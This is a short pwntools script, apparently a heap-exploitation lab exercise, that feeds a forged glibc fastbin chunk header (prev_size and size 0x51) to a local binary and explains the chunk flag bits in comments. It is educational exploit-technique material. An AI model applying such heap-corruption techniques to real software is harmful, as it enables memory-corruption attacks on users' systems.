from pwn import * 

p = process("./fix_fastbin") 
#gdb.attach(p) 

# This field does not matter because the fastbin chunks do not deal with the consolidation process (at least, with this example)
prev_size = p64(0x100)

'''
0x50: Fastbin chunks sizes must match the bin size when being removed. Anything that is not between 0x50 to 0x5f will not work because of this issue.
Flags: 
	- 0: PREV_INUSE: 
		- Is the previous chunk in use? Well, sorta... the first chunk ALWAYS has the prev_inuse bit set to 1. 
		- So, to be accurate, we set this bit.
		- In reality, this bit DOES NOT have to be set, because the chunk (in the fastbin) does not take in consolidation steps at this point. So, even if it was not set, nothing bad happens.
		- In fact, having ALL of the flags set will still make this work!
	- 1: This is NOT mmapped memory (do not set the value then) 
	- 2: This is the main arena (don't set the value then)
'''

size = p64(0x50 + 0x1)
p.sendline(prev_size + size)
p.interactive()
